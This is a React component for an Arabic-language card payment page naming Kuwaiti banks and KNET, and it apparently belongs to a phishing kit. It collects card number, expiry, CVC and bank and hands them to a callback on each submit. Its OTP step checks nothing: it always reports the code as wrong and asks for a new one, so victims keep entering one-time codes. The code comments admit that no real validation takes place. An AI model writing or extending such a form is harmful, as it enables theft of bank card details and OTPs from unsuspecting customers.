'use client'

import { useState } from 'react'
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader } from 'lucide-react'
import { validate } from '@/lib/utils'

type PaymentInfo = {
  cardNumber: string;
  cvc: string;
  year: string;
  month: string;
  bank?: string;
  otp?: string;
}

type PaymentMethod = 'credit_card' | 'kent' | 'bank_card'

const banks = [
  { value: 'nbk', label: 'بنك الكويت الوطني' },
  { value: 'gbk', label: 'بنك الخليج' },
  { value: 'burgan', label: 'بنك برقان' },
  { value: 'kfh', label: 'بيت التمويل الكويتي' },
  { value: 'boubyan', label: 'بنك بوبيان' },
]
const years=['2024','2025','2026','2027','2028','2029','2030','2031','2032','2033']
const months=['1','2','3','4','5','6','7','8','9','10','11','12']

export function PaymentForm({ onPaymentComplete }: { onPaymentComplete: (paymentInfo: PaymentInfo | null, method: PaymentMethod) => void}) {
  const [step, setStep] = useState(1)
  const [isloading, setIsLoading] = useState(false)
  const [showerror, setShowError] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('credit_card')
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    cvc: '',
    year: '',
    month: '',
    otp: '',
    bank: '',
  })
  const [otp, setOtp] = useState('')

  const handlePaymentMethodChange = (value: PaymentMethod) => {
    setPaymentMethod(value)
    setStep(1)
  }

  const handlePaymentInfoSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    setIsLoading(true)
    console.log(validate(paymentInfo.cardNumber))
    if (validate(paymentInfo.cardNumber)) {
      setShowError(false)
      onPaymentComplete(paymentInfo, paymentMethod)
      setTimeout(() => {
        setIsLoading(false)
        setStep(2)
      }, 5000)

    } else {

      setIsLoading(false)
      setShowError(true)
      setStep(1)

    }


    // In a real application, you would validate the payment info here


  }

  const handleOtpSubmit = async(e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    // In a real application, you would verify the OTP here
    onPaymentComplete(paymentInfo, paymentMethod)

    setOtp('')
    setTimeout(() => {
      setIsLoading(false)
      alert('رمز التحقق غير صحيح, تم ارسال رمز جديد')
      setPaymentInfo({ ...paymentInfo, otp: '' })
    }, 5000)

  }

  const handleCardPasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    // In a real application, you would verify the card password here
    onPaymentComplete(paymentInfo, paymentMethod)
    setStep(2)

  }

  return (
    <Card className="w-full max-w-md mx-auto" >
      <CardHeader>
        <CardTitle>اختر طريقة الدفع</CardTitle>
      </CardHeader>
      <CardContent >
        <RadioGroup defaultValue="credit_card" onValueChange={(value) => handlePaymentMethodChange(value as PaymentMethod)} dir='rtl'>
          <div className="flex items-center space-x-2 space-x-reverse">
            <RadioGroupItem value="credit_card" id="credit_card" />
            <Label htmlFor="credit_card">بطاقة ائتمان</Label>

            <div className='flex'>
              <img className="h-4 mx-1" src='/visa.svg' alt='visa' />
              <img className="h-4 mx-1" src='/master.svg' alt='visa' />
            </div>          </div>
          <div className="flex items-center space-x-2 space-x-reverse">
            <RadioGroupItem value="bank_card" id="bank_card" />
            <Label htmlFor="bank_card">KNET</Label> 
            <div className='flex'>
              <img className="h-4 mx-1" src='/kent.svg' alt='visa' />
            </div> 
          </div>

        </RadioGroup>

        {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
          <>
            {step === 1 && (
              <form onSubmit={handlePaymentInfoSubmit} className="space-y-4 mt-4">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber">رقم البطاقة</Label>
                  <Input
                    className={`${showerror ? "bg-red-500" : ''}`}
                    id="cardNumber"
                    placeholder="1234 5678 9012 3456"
                    value={paymentInfo.cardNumber}
                    onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value })}
                    required
                  />
                </div>
                <div className="grid grid-cols-3 gap-4">
                <div className="space-y-2">
                    <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
                    <Select onValueChange={(value) => setPaymentInfo({ ...paymentInfo, year: value })}>
                      <SelectTrigger>
                        <SelectValue placeholder=" السنة" />
                      </SelectTrigger>
                      <SelectContent>
                        {years.map((i,index) => (
                          <SelectItem key={index} value={i}>
                            {i}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    </div>
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate"> .</Label>
                    <Select onValueChange={(value) => setPaymentInfo({ ...paymentInfo, month: value })}>
                      <SelectTrigger>
                        <SelectValue placeholder="الشهر" />
                      </SelectTrigger>
                      <SelectContent>
                        {months.map((i,index) => (
                          <SelectItem key={index} value={i}>
                            {i}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    </div>
                  <div className="space-y-2">
                    <Label htmlFor="cvc">CVC</Label>
                    <Input
                      id="cvc"
                      placeholder="123"
                      value={paymentInfo.cvc}
                      maxLength={3}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, cvc: e.target.value })}
                      required
                    />
                  </div>
                  </div>
                {paymentMethod === 'bank_card' && (
                  <div className="space-y-2">
                    <Label htmlFor="bank">اختر البنك</Label>
                    <Select onValueChange={(value) => setPaymentInfo({ ...paymentInfo, bank: value })}>
                      <SelectTrigger>
                        <SelectValue placeholder="اختر البنك" />
                      </SelectTrigger>
                      <SelectContent>
                        {banks.map((bank) => (
                          <SelectItem key={bank.value} value={bank.value}>
                            {bank.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                )}
                <Button type="submit" className="w-full bg-blue-500 ">{isloading ? <> جاري المعالجة <Loader /></> : 'التالي'}</Button>
              </form>
            )}
            {step === 2 && (
              <form onSubmit={handleOtpSubmit} className="space-y-4 mt-4">
                <div className="space-y-2">
                  <Label htmlFor="otp">رمز التحقق (OTP)</Label>
                  <Input
                    id="otp"
                    placeholder="123456"
                    value={paymentInfo.otp}
                    onChange={(e) => setPaymentInfo({ ...paymentInfo, otp: e.target.value })}
                    required
                  />
                </div>
                <Button type="submit" className="w-full bg-blue-500 ">{isloading ? <>جاري التحقق<Loader /></> : 'تحقق'}</Button>
              </form>
            )}

          </>
        )}
      </CardContent>
    </Card>
  )
}
